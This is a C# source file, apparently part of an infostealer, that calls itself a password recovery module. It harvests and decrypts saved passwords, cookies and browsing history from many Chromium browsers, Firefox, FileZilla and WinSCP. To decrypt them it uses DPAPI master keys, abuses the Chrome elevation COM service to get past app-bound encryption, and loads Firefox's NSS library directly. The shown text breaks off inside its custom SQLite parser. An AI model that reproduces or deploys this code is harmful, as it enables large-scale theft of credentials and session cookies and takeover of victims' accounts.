// language: C#, file: Intellix/Recovery/PasswordRecoveryModule.cs, target: .NET 4.7.2
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace mullvad.Module.Intellix
{
    internal static class PasswordRecovery
    {
        // ── Entry points ──────────────────────────────────────────────────────────

        public static string RecoverPasswords()
        {
            var rows = new List<string[]>();
            foreach (var p in ChromiumProfiles())
                ReadChromiumPasswords(rows, p.Browser, p.Root, p.LocalState);
            ReadFirefoxPasswords(rows);
            ReadFileZillaPasswords(rows);
            ReadWinScpPasswords(rows);
            return BuildJsonArray(rows, new[] { "url", "username", "password", "app" });
        }

        public static string RecoverCookies()
        {
            var rows = new List<string[]>();
            foreach (var p in ChromiumProfiles())
                ReadChromiumCookies(rows, p.Browser, p.Root, p.LocalState);
            ReadFirefoxCookies(rows);
            return BuildJsonArray(rows, new[] { "browser", "host", "name", "value", "path", "secure", "httponly", "expires" });
        }

        public static string RecoverHistory()
        {
            var rows = new List<string[]>();
            foreach (var p in ChromiumProfiles())
                ReadChromiumHistory(rows, p.Browser, p.Root);
            ReadFirefoxHistory(rows);
            return BuildJsonArray(rows, new[] { "browser", "url", "title", "visits", "last_visit" });
        }

        // ── Browser profile list ──────────────────────────────────────────────────

        private struct BrowserProfile { public string Browser, Root, LocalState; }

        private static IEnumerable<BrowserProfile> ChromiumProfiles()
        {
            string local   = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var defs = new (string browser, string root)[]
            {
                ("Chrome",       Path.Combine(local,   "Google",         "Chrome",        "User Data")),
                ("Chrome Beta",  Path.Combine(local,   "Google",         "Chrome Beta",   "User Data")),
                ("Edge",         Path.Combine(local,   "Microsoft",      "Edge",          "User Data")),
                ("Brave",        Path.Combine(local,   "BraveSoftware",  "Brave-Browser", "User Data")),
                ("Opera",        Path.Combine(appData, "Opera Software", "Opera Stable")),
                ("Opera GX",     Path.Combine(appData, "Opera Software", "Opera GX Stable")),
                ("Vivaldi",      Path.Combine(local,   "Vivaldi",        "User Data")),
                ("Yandex",       Path.Combine(local,   "Yandex",         "YandexBrowser", "User Data")),
                ("Chromium",     Path.Combine(local,   "Chromium",       "User Data")),
                ("Avast Secure", Path.Combine(local,   "AVAST Software", "Browser",       "User Data")),
                ("AVG Secure",   Path.Combine(local,   "AVG",            "Browser",       "User Data")),
            };
            foreach (var (browser, root) in defs)
            {
                if (!Directory.Exists(root)) continue;
                string ls = Path.Combine(root, "Local State");
                yield return new BrowserProfile { Browser = browser, Root = root, LocalState = File.Exists(ls) ? ls : null };
            }
        }

        private static IEnumerable<string> ProfileDirs(string root)
        {
            yield return Path.Combine(root, "Default");
            for (int i = 1; i <= 30; i++) yield return Path.Combine(root, "Profile " + i);
        }

        // ── Chromium passwords ────────────────────────────────────────────────────

        private static void ReadChromiumPasswords(List<string[]> results,
            string browser, string root, string lsPath)
        {
            byte[] mk  = lsPath != null ? GetMasterKey(lsPath)   : null;
            byte[] abk = lsPath != null ? GetAppBoundKey(lsPath) : null;

            foreach (string dir in ProfileDirs(root))
            {
                string db = Path.Combine(dir, "Login Data");
                if (!File.Exists(db)) continue;
                string tmp = Path.GetTempFileName();
                try
                {
                    File.Copy(db, tmp, true);
                    var h = new SQLiteHandler(tmp);
                    if (!h.ReadTable("logins")) continue;
                    for (int i = 0; i < h.GetRowCount(); i++)
                    {
                        try
                        {
                            string url  = h.GetValue(i, "origin_url")    ?? "";
                            string user = h.GetValue(i, "username_value") ?? "";
                            byte[] enc  = h.GetBlobValue(i, "password_value") ?? Array.Empty<byte>();
                            if (enc.Length == 0)
                            {
                                string s = h.GetValue(i, "password_value") ?? "";
                                if (s.Length > 0) enc = Encoding.UTF8.GetBytes(s);
                            }
                            string pass = enc.Length > 0 ? DecryptChromium(enc, mk, abk) : "";
                            results.Add(new[] { url, user, pass, browser });
                        }
                        catch { }
                    }
                }
                catch { }
                finally { try { File.Delete(tmp); } catch { } }
            }
        }

        // ── Firefox passwords ─────────────────────────────────────────────────────

        private static void ReadFirefoxPasswords(List<string[]> results)
        {
            string root = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Mozilla\Firefox\Profiles");
            if (!Directory.Exists(root)) return;

            foreach (string dir in Directory.GetDirectories(root))
            {
                string loginsFile  = Path.Combine(dir, "logins.json");
                string signonsFile = Path.Combine(dir, "signons.sqlite");
                if (!File.Exists(loginsFile) && !File.Exists(signonsFile)) continue;

                using (var ff = new FFDecryptor())
                {
                    try { if (ff.Init(dir) != 0) continue; }
                    catch { continue; }

                    if (File.Exists(signonsFile))
                    {
                        string tmp = Path.GetTempFileName();
                        try
                        {
                            File.Copy(signonsFile, tmp, true);
                            var h = new SQLiteHandler(tmp);
                            if (h.ReadTable("moz_logins"))
                            {
                                for (int i = 0; i < h.GetRowCount(); i++)
                                {
                                    try
                                    {
                                        string host = h.GetValue(i, "hostname") ?? "";
                                        string user = ff.Decrypt(h.GetValue(i, "encryptedUsername") ?? "") ?? "";
                                        string pass = ff.Decrypt(h.GetValue(i, "encryptedPassword") ?? "") ?? "";
                                        if (!string.IsNullOrEmpty(user))
                                            results.Add(new[] { host, user, pass, "Firefox" });
                                    }
                                    catch { }
                                }
                            }
                        }
                        catch { }
                        finally { try { File.Delete(tmp); } catch { } }
                    }

                    if (File.Exists(loginsFile))
                    {
                        try
                        {
                            FFLoginsJson data;
                            var dcs = new DataContractJsonSerializer(typeof(FFLoginsJson));
                            using (var fs = File.OpenRead(loginsFile))
                                data = (FFLoginsJson)dcs.ReadObject(fs);
                            if (data?.Logins != null)
                            {
                                foreach (var login in data.Logins)
                                {
                                    try
                                    {
                                        string user = ff.Decrypt(login.EncryptedUsername ?? "") ?? "";
                                        string pass = ff.Decrypt(login.EncryptedPassword ?? "") ?? "";
                                        if (!string.IsNullOrEmpty(user))
                                            results.Add(new[] { login.Hostname ?? "", user, pass, "Firefox" });
                                    }
                                    catch { }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
        }

        [DataContract] private class FFLoginsJson { [DataMember(Name = "logins")] public FFLogin[] Logins; }
        [DataContract] private class FFLogin
        {
            [DataMember(Name = "hostname")]          public string Hostname;
            [DataMember(Name = "encryptedUsername")] public string EncryptedUsername;
            [DataMember(Name = "encryptedPassword")] public string EncryptedPassword;
        }

        // ── FileZilla ─────────────────────────────────────────────────────────────

        private static void ReadFileZillaPasswords(List<string[]> results)
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            foreach (string xmlPath in new[]
            {
                Path.Combine(appData, @"FileZilla\recentservers.xml"),
                Path.Combine(appData, @"FileZilla\sitemanager.xml"),
            })
            {
                if (!File.Exists(xmlPath)) continue;
                try
                {
                    var doc = new XmlDocument();
                    using (var r = new XmlTextReader(xmlPath)) doc.Load(r);
                    var container = doc.DocumentElement?.ChildNodes?[0];
                    if (container == null) continue;
                    foreach (XmlNode server in container.ChildNodes)
                    {
                        string host = "", user = "", pass = "";
                        foreach (XmlNode c in server.ChildNodes)
                        {
                            switch (c.Name)
                            {
                                case "Host": host = c.InnerText; break;
                                case "Port": host += ":" + c.InnerText; break;
                                case "User": user  = c.InnerText; break;
                                case "Pass":
                                    try { pass = Encoding.UTF8.GetString(Convert.FromBase64String(c.InnerText)); }
                                    catch { pass = c.InnerText; }
                                    break;
                            }
                        }
                        results.Add(new[] { host, user, pass, "FileZilla" });
                    }
                }
                catch { }
            }
        }

        // ── WinSCP ────────────────────────────────────────────────────────────────

        private static void ReadWinScpPasswords(List<string[]> results)
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"))
                {
                    if (key == null) return;
                    foreach (string name in key.GetSubKeyNames())
                    {
                        try
                        {
                            using (var sub = key.OpenSubKey(name))
                            {
                                if (sub == null) continue;
                                string host = sub.GetValue("HostName")   as string ?? "";
                                if (string.IsNullOrEmpty(host)) continue;
                                string user = sub.GetValue("UserName")   as string ?? "";
                                string enc  = sub.GetValue("Password")   as string ?? "";
                                string port = sub.GetValue("PortNumber") as string ?? "22";
                                string pass = WinScpDecrypt(user, enc, host);
                                results.Add(new[] { host + ":" + port, user, pass, "WinSCP" });
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }

        private static int WinScpNextChar(List<string> list)
        {
            int a = int.Parse(list[0]), b = int.Parse(list[1]);
            return 255 ^ (((a << 4) + b) ^ 0xA3) & 0xFF;
        }

        private static string WinScpDecrypt(string user, string pass, string host)
        {
            if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass) || string.IsNullOrEmpty(host))
                return "";
            try
            {
                var raw = new List<string>();
                foreach (char c in pass.ToUpperInvariant())
                {
                    if      (c == 'A') raw.Add("10"); else if (c == 'B') raw.Add("11");
                    else if (c == 'C') raw.Add("12"); else if (c == 'D') raw.Add("13");
                    else if (c == 'E') raw.Add("14"); else if (c == 'F') raw.Add("15");
                    else raw.Add(c.ToString());
                }
                if (WinScpNextChar(raw) == 255)
                { raw.RemoveAt(0); raw.RemoveAt(0); raw.RemoveAt(0); raw.RemoveAt(0); }
                int length = WinScpNextChar(raw); raw.RemoveAt(0); raw.RemoveAt(0);
                int todel  = WinScpNextChar(raw) * 2; raw.RemoveAt(0); raw.RemoveAt(0);
                for (int i = 0; i < todel; i++) raw.RemoveAt(0);
                var sb = new StringBuilder();
                for (int i = -1; i < length; i++)
                { sb.Append((char)WinScpNextChar(raw)); raw.RemoveAt(0); raw.RemoveAt(0); }
                string result = sb.ToString();
                string prefix = user + host;
                int idx = result.IndexOf(prefix, StringComparison.Ordinal);
                if (idx >= 0) result = result.Substring(idx + prefix.Length);
                return result;
            }
            catch { return ""; }
        }

        // ── Chromium cookies ──────────────────────────────────────────────────────

        private static void ReadChromiumCookies(List<string[]> results,
            string browser, string root, string lsPath)
        {
            byte[] mk  = lsPath != null ? GetMasterKey(lsPath)   : null;
            byte[] abk = lsPath != null ? GetAppBoundKey(lsPath) : null;

            foreach (string dir in ProfileDirs(root))
            {
                string db = Path.Combine(dir, "Network", "Cookies");
                if (!File.Exists(db)) db = Path.Combine(dir, "Cookies");
                if (!File.Exists(db)) continue;
                string tmp = Path.GetTempFileName();
                try
                {
                    File.Copy(db, tmp, true);
                    var h = new SQLiteHandler(tmp);
                    if (!h.ReadTable("cookies")) continue;
                    for (int i = 0; i < h.GetRowCount(); i++)
                    {
                        try
                        {
                            string host   = h.GetValue(i, "host_key")    ?? "";
                            string name   = h.GetValue(i, "name")        ?? "";
                            string path   = h.GetValue(i, "path")        ?? "";
                            string sec    = h.GetValue(i, "is_secure")   ?? "0";
                            string http   = h.GetValue(i, "is_httponly") ?? "0";
                            string expRaw = h.GetValue(i, "expires_utc") ?? "0";
                            byte[] enc    = h.GetBlobValue(i, "encrypted_value") ?? Array.Empty<byte>();
                            string value  = enc.Length > 0
                                ? DecryptChromium(enc, mk, abk)
                                : (h.GetValue(i, "value") ?? "");
                            string expires = "Session";
                            if (long.TryParse(expRaw, out long exp) && exp > 0)
                            {
                                try { expires = new DateTime(1601,1,1,0,0,0,DateTimeKind.Utc).AddTicks(exp * 10L).ToString("yyyy-MM-dd"); }
                                catch { expires = exp.ToString(); }
                            }
                            results.Add(new[] { browser, host, name, value, path, sec, http, expires });
                        }
                        catch { }
                    }
                }
                catch { }
                finally { try { File.Delete(tmp); } catch { } }
            }
        }

        // ── Firefox cookies ───────────────────────────────────────────────────────

        private static void ReadFirefoxCookies(List<string[]> results)
        {
            string root = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Mozilla\Firefox\Profiles");
            if (!Directory.Exists(root)) return;
            foreach (string dir in Directory.GetDirectories(root))
            {
                string db = Path.Combine(dir, "cookies.sqlite");
                if (!File.Exists(db)) continue;
                string tmp = Path.GetTempFileName();
                try
                {
                    File.Copy(db, tmp, true);
                    var h = new SQLiteHandler(tmp);
                    if (!h.ReadTable("moz_cookies")) continue;
                    for (int i = 0; i < h.GetRowCount(); i++)
                    {
                        try
                        {
                            string host   = h.GetValue(i, "host")       ?? "";
                            string name   = h.GetValue(i, "name")       ?? "";
                            string value  = h.GetValue(i, "value")      ?? "";
                            string path   = h.GetValue(i, "path")       ?? "";
                            string sec    = h.GetValue(i, "isSecure")   ?? "0";
                            string http   = h.GetValue(i, "isHttpOnly") ?? "0";
                            string expRaw = h.GetValue(i, "expiry")     ?? "0";
                            string expires = "Session";
                            if (long.TryParse(expRaw, out long exp) && exp > 0)
                                expires = new DateTime(1970,1,1,0,0,0,DateTimeKind.Utc).AddSeconds(exp).ToString("yyyy-MM-dd");
                            results.Add(new[] { "Firefox", host, name, value, path, sec, http, expires });
                        }
                        catch { }
                    }
                }
                catch { }
                finally { try { File.Delete(tmp); } catch { } }
            }
        }

        // ── Chromium history ──────────────────────────────────────────────────────

        private static void ReadChromiumHistory(List<string[]> results, string browser, string root)
        {
            foreach (string dir in ProfileDirs(root))
            {
                string db = Path.Combine(dir, "History");
                if (!File.Exists(db)) continue;
                string tmp = Path.GetTempFileName();
                try
                {
                    File.Copy(db, tmp, true);
                    var h = new SQLiteHandler(tmp);
                    if (!h.ReadTable("urls")) continue;
                    for (int i = 0; i < h.GetRowCount(); i++)
                    {
                        try
                        {
                            string url     = h.GetValue(i, "url")             ?? "";
                            string title   = h.GetValue(i, "title")           ?? "";
                            string visits  = h.GetValue(i, "visit_count")     ?? "0";
                            string rawTime = h.GetValue(i, "last_visit_time") ?? "0";
                            string last = "";
                            if (long.TryParse(rawTime, out long t) && t > 0)
                            {
                                try { last = new DateTime(1601,1,1,0,0,0,DateTimeKind.Utc).AddTicks(t * 10L).ToString("yyyy-MM-dd"); }
                                catch { last = t.ToString(); }
                            }
                            results.Add(new[] { browser, url, title, visits, last });
                        }
                        catch { }
                    }
                }
                catch { }
                finally { try { File.Delete(tmp); } catch { } }
            }
        }

        // ── Firefox history ───────────────────────────────────────────────────────

        private static void ReadFirefoxHistory(List<string[]> results)
        {
            string root = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Mozilla\Firefox\Profiles");
            if (!Directory.Exists(root)) return;
            foreach (string dir in Directory.GetDirectories(root))
            {
                string db = Path.Combine(dir, "places.sqlite");
                if (!File.Exists(db)) continue;
                string tmp = Path.GetTempFileName();
                try
                {
                    File.Copy(db, tmp, true);
                    var h = new SQLiteHandler(tmp);
                    if (!h.ReadTable("moz_places")) continue;
                    for (int i = 0; i < h.GetRowCount(); i++)
                    {
                        try
                        {
                            string url     = h.GetValue(i, "url")             ?? "";
                            string title   = h.GetValue(i, "title")           ?? "";
                            string visits  = h.GetValue(i, "visit_count")     ?? "0";
                            string rawTime = h.GetValue(i, "last_visit_date") ?? "0";
                            string last = "";
                            if (long.TryParse(rawTime, out long t) && t > 0)
                            {
                                try { last = new DateTime(1970,1,1,0,0,0,DateTimeKind.Utc).AddTicks(t * 10L).ToString("yyyy-MM-dd"); }
                                catch { last = t.ToString(); }
                            }
                            results.Add(new[] { "Firefox", url, title, visits, last });
                        }
                        catch { }
                    }
                }
                catch { }
                finally { try { File.Delete(tmp); } catch { } }
            }
        }

        // ── Crypto ────────────────────────────────────────────────────────────────

        private static byte[] GetMasterKey(string lsPath)
        {
            try
            {
                string json = File.ReadAllText(lsPath);
                const string marker = "\"encrypted_key\":\"";
                int s = json.IndexOf(marker); if (s < 0) return null;
                s += marker.Length;
                int e = json.IndexOf('"', s); if (e < 0) return null;
                byte[] raw = Convert.FromBase64String(json.Substring(s, e - s));
                if (raw.Length < 5) return null;
                byte[] d = new byte[raw.Length - 5];
                Buffer.BlockCopy(raw, 5, d, 0, d.Length);
                return ProtectedData.Unprotect(d, null, DataProtectionScope.CurrentUser);
            }
            catch { return null; }
        }

        private static byte[] GetAppBoundKey(string lsPath)
        {
            try
            {
                string json = File.ReadAllText(lsPath);
                const string marker = "\"app_bound_fixed_data\":\"";
                int s = json.IndexOf(marker); if (s < 0) return null;
                s += marker.Length;
                int e = json.IndexOf('"', s); if (e < 0) return null;
                byte[] enc = Convert.FromBase64String(json.Substring(s, e - s));
                char[] chars = new char[enc.Length];
                for (int i = 0; i < enc.Length; i++) chars[i] = (char)enc[i];
                string bstr = new string(chars);
                foreach (string clsid in new[] { "{708860E0-F641-4611-8895-7D867DD3675B}", "{1FCBE96C-1697-43AF-9140-2897C7C69767}" })
                {
                    byte[] key = TryDecryptAppBound(new Guid(clsid), bstr);
                    if (key != null) return key;
                }
                return null;
            }
            catch { return null; }
        }

        [ComImport, Guid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IElevationService
        {
            void RunRecoveryCRXElevated([MarshalAs(UnmanagedType.LPWStr)] string a, [MarshalAs(UnmanagedType.LPWStr)] string b,
                [MarshalAs(UnmanagedType.LPWStr)] string c, [MarshalAs(UnmanagedType.LPWStr)] string d, uint pid, out ulong handle);
            void EncryptData(uint level, [MarshalAs(UnmanagedType.BStr)] string plain,
                [MarshalAs(UnmanagedType.BStr)] out string cipher, out uint err);
            void DecryptData([MarshalAs(UnmanagedType.BStr)] string cipher,
                [MarshalAs(UnmanagedType.BStr)] out string plain, out uint err);
        }

        private static byte[] TryDecryptAppBound(Guid clsid, string bstr)
        {
            try
            {
                Type t = Type.GetTypeFromCLSID(clsid, false);
                if (t == null) return null;
                var svc = (IElevationService)Activator.CreateInstance(t);
                svc.DecryptData(bstr, out string plain, out uint err);
                if (err != 0 || string.IsNullOrEmpty(plain)) return null;
                byte[] key = new byte[plain.Length];
                for (int i = 0; i < plain.Length; i++) key[i] = (byte)plain[i];
                return key;
            }
            catch { return null; }
        }

        private static string DecryptChromium(byte[] data, byte[] masterKey, byte[] appBoundKey)
        {
            if (data == null || data.Length == 0) return "";
            try
            {
                if (data.Length > 3 && data[0] == 'v')
                {
                    if (data[1] == '1' && (data[2] == '0' || data[2] == '1'))
                        return masterKey != null ? AesGcmDecryptChrome(data, masterKey) : "";
                    if (data[1] == '2' && data[2] == '0')
                        return appBoundKey != null ? AesGcmDecryptChrome(data, appBoundKey) : "";
                }
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser));
            }
            catch { return ""; }
        }

        private static string AesGcmDecryptChrome(byte[] data, byte[] key)
        {
            if (data.Length < 31) return "";
            byte[] nonce = new byte[12];
            byte[] ct    = new byte[data.Length - 31];
            byte[] tag   = new byte[16];
            Buffer.BlockCopy(data, 3,                nonce, 0, 12);
            Buffer.BlockCopy(data, 15,               ct,    0, ct.Length);
            Buffer.BlockCopy(data, data.Length - 16, tag,   0, 16);
            byte[] plain = AesGcmDecrypt(key, nonce, ct, tag);
            return plain != null ? Encoding.UTF8.GetString(plain) : "";
        }

        [DllImport("bcrypt.dll")] static extern int BCryptOpenAlgorithmProvider(out IntPtr h, string id, string impl, int f);
        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)] static extern int BCryptSetProperty(IntPtr h, string p, byte[] v, int n, int f);
        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)] static extern int BCryptGetProperty(IntPtr h, string p, byte[] outp, int n, out int cb, int f);
        [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr hKey, byte[] obj, int objLen, byte[] secret, int secLen, int f);
        [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr hKey, byte[] inp, int inpLen, ref AeadInfo info, byte[] iv, int ivLen, byte[] outp, int outLen, out int cbResult, int f);
        [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr h);
        [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr h, int f);

        [StructLayout(LayoutKind.Sequential)]
        private struct AeadInfo
        {
            public int cbSize, dwInfoVersion;
            public IntPtr pbNonce;    public int cbNonce;
            public IntPtr pbAuthData; public int cbAuthData;
            public IntPtr pbTag;      public int cbTag;
            public IntPtr pbMacContext; public int cbMacContext;
            public int cbAAD; public long cbData; public int dwFlags;
        }

        private static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] ct, byte[] tag)
        {
            IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero;
            try
            {
                if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
                byte[] mode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
                BCryptSetProperty(hAlg, "ChainingMode", mode, mode.Length, 0);
                byte[] objBuf = new byte[4]; int cb;
                BCryptGetProperty(hAlg, "ObjectLength", objBuf, 4, out cb, 0);
                byte[] keyObj = new byte[BitConverter.ToInt32(objBuf, 0)];
                if (BCryptGenerateSymmetricKey(hAlg, out hKey, keyObj, keyObj.Length, key, key.Length, 0) != 0) return null;
                var hn = GCHandle.Alloc(nonce, GCHandleType.Pinned);
                var ht = GCHandle.Alloc(tag,   GCHandleType.Pinned);
                try
                {
                    var info = new AeadInfo
                    {
                        cbSize = Marshal.SizeOf(typeof(AeadInfo)), dwInfoVersion = 1,
                        pbNonce = hn.AddrOfPinnedObject(), cbNonce = nonce.Length,
                        pbTag   = ht.AddrOfPinnedObject(), cbTag   = tag.Length,
                    };
                    byte[] output = new byte[ct.Length]; int outLen;
                    if (BCryptDecrypt(hKey, ct, ct.Length, ref info, null, 0, output, output.Length, out outLen, 0) != 0) return null;
                    if (outLen < output.Length) Array.Resize(ref output, outLen);
                    return output;
                }
                finally { hn.Free(); ht.Free(); }
            }
            catch { return null; }
            finally
            {
                if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
                if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
            }
        }

        // ── FFDecryptor ───────────────────────────────────────────────────────────

        private sealed class FFDecryptor : IDisposable
        {
            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] static extern IntPtr LoadLibrary(string p);
            [DllImport("kernel32.dll")] static extern bool FreeLibrary(IntPtr h);
            [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]   static extern IntPtr GetProcAddress(IntPtr h, string n);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate long  NssInitFn(string dir);
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate long  NssShutdownFn();
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)] delegate int   Pk11DecryptFn(ref SECItem data, ref SECItem result, int cx);

            [StructLayout(LayoutKind.Sequential)]
            struct SECItem { public int Type; public IntPtr Data; public int Len; }

            NssInitFn     _init;
            NssShutdownFn _shutdown;
            Pk11DecryptFn _decrypt;
            IntPtr _hMoz, _hNss;

            public long Init(string profileDir)
            {
                string ff = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Mozilla Firefox");
                if (!Directory.Exists(ff))
                    ff = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Mozilla Firefox");
                if (!Directory.Exists(ff)) return -1;
                _hMoz = LoadLibrary(Path.Combine(ff, "mozglue.dll"));
                _hNss = LoadLibrary(Path.Combine(ff, "nss3.dll"));
                if (_hNss == IntPtr.Zero) return -1;
                _init     = (NssInitFn)    Marshal.GetDelegateForFunctionPointer(GetProcAddress(_hNss, "NSS_Init"),        typeof(NssInitFn));
                _shutdown = (NssShutdownFn)Marshal.GetDelegateForFunctionPointer(GetProcAddress(_hNss, "NSS_Shutdown"),    typeof(NssShutdownFn));
                _decrypt  = (Pk11DecryptFn)Marshal.GetDelegateForFunctionPointer(GetProcAddress(_hNss, "PK11SDR_Decrypt"), typeof(Pk11DecryptFn));
                return _init(profileDir);
            }

            public string Decrypt(string base64)
            {
                if (string.IsNullOrEmpty(base64) || _decrypt == null) return null;
                byte[] raw;
                try { raw = Convert.FromBase64String(base64); } catch { return null; }
                IntPtr ptr = Marshal.AllocHGlobal(raw.Length);
                try
                {
                    Marshal.Copy(raw, 0, ptr, raw.Length);
                    SECItem inp = new SECItem { Type = 0, Data = ptr, Len = raw.Length };
                    SECItem out_ = new SECItem();
                    if (_decrypt(ref inp, ref out_, 0) == 0 && out_.Len > 0)
                    {
                        byte[] buf = new byte[out_.Len];
                        Marshal.Copy(out_.Data, buf, 0, out_.Len);
                        return Encoding.ASCII.GetString(buf);
                    }
                    return null;
                }
                catch { return null; }
                finally { Marshal.FreeHGlobal(ptr); }
            }

            public void Dispose()
            {
                try { _shutdown?.Invoke(); } catch { }
                if (_hNss != IntPtr.Zero) FreeLibrary(_hNss);
                if (_hMoz != IntPtr.Zero) FreeLibrary(_hMoz);
            }
        }

        // ── SQLiteHandler (with blob support) ─────────────────────────────────────

        private sealed class SQLiteHandler
        {
            readonly byte[]  _db;
            readonly ushort  _pageSize;
            readonly ulong   _enc;
            readonly byte[]  _typeSz = { 0,1,2,3,4,6,8,8,0,0 };

            string[]   _fields = new string[0];
            string[][] _rows   = new string[0][];
            byte[][][] _blobs  = new byte[0][][];

            struct MasterEntry { public string Name; public long Root; public string Sql; }
            MasterEntry[] _master = new MasterEntry[0];

            public SQLiteHandler(string path)
            {
                if (!File.Exists(path)) return;
                _db = File.ReadAllBytes(path);
                if (_db.Length < 100 || Encoding.ASCII.GetString(_db, 0, 15) != "SQLite format 3") return;
                _pageSize = (ushort)Uint(_db, 0x10, 2);
                _enc = Uint(_db, 0x38, 4); if (_enc == 0) _enc = 1;
                var list = new List<MasterEntry>();
                ParseMaster(100, list);
                _master = list.ToArray();
            }

            public bool ReadTable(string name)
            {
                foreach (var m in _master)
                {
                    if (!string.Equals(m.Name, name, StringComparison.OrdinalIgnoreCase)) continue;
                    _fields = ParseColumns(m.Sql);
                    var rows = new List<string[]>(); var blobs = new List<byte[][]>();
                    ReadLeaves((ulong)((m.Root - 1) * _pageSize), rows, blobs);
                    _rows = rows.ToArray(); _blobs = blobs.ToArray();
                    return true;
                }
                return false;
            }

            public int    GetRowCount()             => _rows.Length;
            public string GetValue(int r, string f) { int c = F(f); return c<0||r>=_rows.Length||c>=_rows[r].Length ? null : _rows[r][c]; }
            public byte[] GetBlobValue(int r, string f) { int c = F(f); return c<0||r>=_blobs.Length||c>=_blobs[r].Length ? null : _blobs[r][c]; }
            int F(string f) { for(int i=0;i<_fields.Length;i++) if(string.Equals(_fields[i],f,StringComparison.OrdinalIgnoreCase)) return i; return -1; }

            static string[] ParseColumns(string sql)
            {
                if (string.IsNullOrEmpty(sql)) return new string[0];
                int lp = sql.IndexOf('('); if (lp < 0) return new string[0];
                var cols = new List<string>();
                foreach (string part in sql.Substring(lp+1).Split(','))
                {
                    string t = part.TrimStart().Split(' ')[0].Trim('"','`','[',']','\'');
                    if (string.IsNullOrEmpty(t)) continue;
                    string u = t.ToUpperInvariant();
                    if (u=="UNIQUE"||u=="PRIMARY"||u=="FOREIGN"||u=="CHECK"||u=="CONSTRAINT") break;
                    cols.Add(t);
                }
                return cols.ToArray();
            }

            void ParseMaster(ulong off, List<MasterEntry> list)
            {
                if ((int)off >= _db.Length) return;
                byte pt = _db[(int)off]; int cnt = (int)Uint(_db,(int)off+3,2);
                if (pt == 13)
                {
                    for (int i = 0; i < cnt; i++)
                    {
                        int p=(int)Uint(_db,(int)off+8+i*2,2); if(off!=100) p+=(int)off;
                        int pe=GVL(p); int re=GVL(pe+1); int ds=re+1;
                        int he=GVL(ds); long hl=CVL(ds,he);
                        long[] sz=new long[5]; int hp=ds+1;
                        for(int c=0;c<5;c++){int e2=GVL(hp);sz[c]=Sz(CVL(hp,e2));hp=e2+1;}
                        int dp=ds+(int)hl; dp+=(int)sz[0];
                        string nm=Str(dp,(int)sz[1]); dp+=(int)sz[1]; dp+=(int)sz[2];
                        long rt=(long)Uint(_db,dp,(int)sz[3]); dp+=(int)sz[3];
                        string sqlstr=Str(dp,(int)sz[4]);
                        list.Add(new MasterEntry{Name=nm,Root=rt,Sql=sqlstr});
                    }
                }
                else if (pt == 5)
                {
                    for(int i=0;i<cnt;i++){int p=(int)Uint(_db,(int)off+12+i*2,2);if(off!=100)p+=(int)off;ParseMaster((Uint(_db,p,4)-1)*_pageSize,list);}
                    ParseMaster((Uint(_db,(int)off+8,4)-1)*_pageSize,list);
                }
            }

            void ReadLeaves(ulong off, List<string[]> rows, List<byte[][]> blobs)
            {
                if ((int)off >= _db.Length) return;
                byte pt = _db[(int)off]; int cnt = (int)Uint(_db,(int)off+3,2);
                if (pt == 13)
                {
                    for (int i = 0; i < cnt; i++)
                    {
                        int p=(int)Uint(_db,(int)off+8+i*2,2); if(off!=100) p+=(int)off;
                        int pe=GVL(p); int re=GVL(pe+1); int ds=re+1;
                        int he=GVL(ds); long hl=CVL(ds,he);
                        var serials=new List<long>(); int hp=ds+1;
                        while(hp<ds+hl){int e2=GVL(hp);serials.Add(CVL(hp,e2));hp=e2+1;}
                        var row=new string[serials.Count]; var blob=new byte[serials.Count][];
                        int dp=ds+(int)hl;
                        for(int c=0;c<serials.Count;c++)
                        {
                            long sr=serials[c]; long sz=Sz(sr);
                            if      (sr==0)              row[c]=null;
                            else if (sr>=1&&sr<=6)        row[c]=Uint(_db,dp,(int)sz).ToString();
                            else if (sr==7)               row[c]=BitConverter.ToDouble(_db,dp).ToString();
                            else if (sr==8)               row[c]="0";
                            else if (sr==9)               row[c]="1";
                            else if (sr%2==1&&sr>=13)     row[c]=Str(dp,(int)sz);
                            else if (sr%2==0&&sr>=12)     blob[c]=Raw(dp,(int)sz);
                            dp+=(int)sz;
                        }
                        rows.Add(row); blobs.Add(blob);
                    }
                }
